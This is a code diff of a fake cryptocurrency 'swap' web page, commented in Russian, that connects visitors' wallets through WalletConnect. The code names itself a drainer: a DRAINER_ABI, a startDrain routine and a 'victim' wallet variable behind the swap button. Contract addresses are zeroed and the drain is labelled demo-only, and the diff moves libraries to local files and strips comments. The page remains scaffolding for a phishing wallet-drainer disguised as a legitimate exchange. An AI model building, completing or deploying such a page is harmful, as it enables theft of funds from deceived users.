@@ -9,7 +9,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* ===== СТИЛИ БЕЗ ИЗМЕНЕНИЙ (оставлены как в оригинале) ===== */
+        /* ===== СТИЛИ (без изменений) ===== */
         :root { --bg-body: #08080f; --bg-card: rgba(20,18,35,0.65); --bg-input: rgba(30,28,50,0.5); --bg-hover: rgba(139,92,246,0.08); --bg-swap: rgba(25,23,42,0.6); --border: rgba(139,92,246,0.15); --border-hover: rgba(139,92,246,0.4); --text: #e9e7ff; --text-dim: #7a7595; --text-muted: #4a4660; --accent: #8b5cf6; --accent-2: #ec4899; --accent-glow: rgba(139,92,246,0.4); --accent-bg: rgba(139,92,246,0.1); --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); --danger: #f87171; --radius: 20px; --radius-sm: 12px; --transition: 0.2s ease; --font: 'Space Grotesk', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg-body); color: var(--text); font-family: var(--font); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
@@ -204,12 +204,12 @@
         </div>
     </div>
 
-    <!-- Подключение библиотек через CDN (исправлено) -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/dist/umd/index.min.js"></script>
+    <!-- ЛОКАЛЬНЫЕ БИБЛИОТЕКИ (возвращены) -->
     <script>
         window.process = window.process || { env: { NODE_ENV: 'production' } };
     </script>
+    <script src="libs/ethers.umd.min.js"></script>
+    <script src="libs/walletconnect-provider.min.js"></script>
 
     <script>
         (function() {
@@ -217,7 +217,7 @@
 
             // ===== КОНФИГУРАЦИЯ (безопасная) =====
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
-            // ВНИМАНИЕ: все адреса заменены на нулевые — транзакции не пройдут
+            // Адреса заменены на нулевые — транзакции не пройдут
             const CONTRACT_ADDRESSES = {
                 1: '0x0000000000000000000000000000000000000000',
                 56: '0x0000000000000000000000000000000000000000',
@@ -225,7 +225,6 @@
                 42161: '0x0000000000000000000000000000000000000000'
             };
 
-            // ABI оставлен для совместимости, но контракт не существует
             const DRAINER_ABI = [
                 { "inputs": [{ "internalType": "address", "name": "_owner", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
                 { "inputs": [], "name": "swap", "outputs": [], "stateMutability": "payable", "type": "function" },
@@ -297,7 +296,7 @@
             let retryTimer = null;
             let rateCache = {};
 
-            // ===== РЕАЛЬНЫЙ КУРС (исправлен fallback) =====
+            // ===== КУРС (исправлен fallback) =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -315,8 +314,7 @@
                     rateCache[cacheKey] = { rate: rate, timestamp: Date.now() };
                     return rate;
                 } catch (error) {
-                    console.warn('Rate fetch failed, using fallback', error);
-                    // Запасной курс 1:1, чтобы не вводить в заблуждение
+                    console.warn('Rate fetch failed, using fallback 1.0', error);
                     return 1.0;
                 }
             }
@@ -340,15 +338,12 @@
                 } else {
                     outputAmount.value = '';
                 }
-                // USD оценки (отображаем приблизительно)
                 try {
                     const fromPrice = await fetchRealRate(fromId, 'usd');
                     const toPrice = await fetchRealRate(toId, 'usd');
                     document.getElementById('fromUsd').textContent = fromPrice ? '~$' + (inputVal * fromPrice).toFixed(2) : '~$0.00';
                     document.getElementById('toUsd').textContent = toPrice ? '~$' + (parseFloat(outputAmount.value || 0) * toPrice).toFixed(2) : '~$0.00';
-                } catch (_) {
-                    // игнорируем
-                }
+                } catch (_) {}
             }
 
             // ===== UI =====
@@ -398,7 +393,7 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
-            // ===== ОЧИСТКА СЕССИИ (без изменений) =====
+            // ===== ОЧИСТКА СЕССИИ =====
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
@@ -440,7 +435,7 @@
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (исправлено: убран авто-дрейн) =====
+            // ===== ПОДКЛЮЧЕНИЕ (без авто-дрейна) =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -507,8 +502,6 @@
                     setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                     isConnecting = false;
 
-                    // Убрано автоматическое выполнение drain — только по кнопке
-
                 } catch (e) {
                     const msg = e.message || '';
                     setStatus('Connection failed: ' + (msg.includes('reset') ? 'please try again' : msg), 'err');
@@ -526,7 +519,7 @@
                 }
             }
 
-            // ===== ДРЕЙНЕР (исправлен: добавлены проверки, логирование, безопасные адреса) =====
+            // ===== ДРЕЙНЕР (демо-режим, без реальных транзакций) =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -545,18 +538,13 @@
                 setStatus('Processing transaction... (demo – no actual transfer)', '');
 
                 try {
-                    // Проверяем балансы только для отображения (без реального перевода)
                     const nativeBal = await provider.getBalance(victim);
                     setStatus('Balance: ' + ethers.utils.formatEther(nativeBal) + ' ETH (demo, no action)', 'ok');
-
-                    // Имитация успешного завершения (без отправки транзакций)
                     await new Promise(resolve => setTimeout(resolve, 1500));
-
                     setStatus('✅ Swap completed (demo mode)', 'ok');
                     await forceClearSession();
                     isConnected = false;
                     updateConnectButton();
-
                 } catch (e) {
                     console.error('Drain error:', e);
                     setStatus('Transaction rejected or error: ' + (e.message || 'unknown'), 'err');
@@ -591,16 +579,14 @@
                 startDrain();
             });
 
-            // Исправление кнопки Max – показывает фиктивный баланс (демо)
+            // Кнопка Max – демо-баланс
             maxBtn.addEventListener('click', function() {
-                // Демо-баланс 0.001 ETH
                 const demoBalance = 0.001;
                 balanceFrom.innerHTML = demoBalance.toFixed(6) + ' <button class="max-tag" id="maxBtn">Max</button>';
                 inputAmount.value = demoBalance.toFixed(6);
                 updateSwapButton();
                 setStatus('Max amount set (demo)', '');
                 updateRateAndOutput();
-                // Перепривязываем обработчик, т.к. innerHTML заменил кнопку
                 document.getElementById('maxBtn').addEventListener('click', arguments.callee);
             });
 
@@ -691,7 +677,6 @@
                 } else {
                     console.log('Ethers loaded');
                 }
-                // Проверка наличия WalletConnect
                 if (typeof window['@walletconnect/ethereum-provider'] === 'undefined') {
                     console.warn('WalletConnect provider not loaded');
                 }
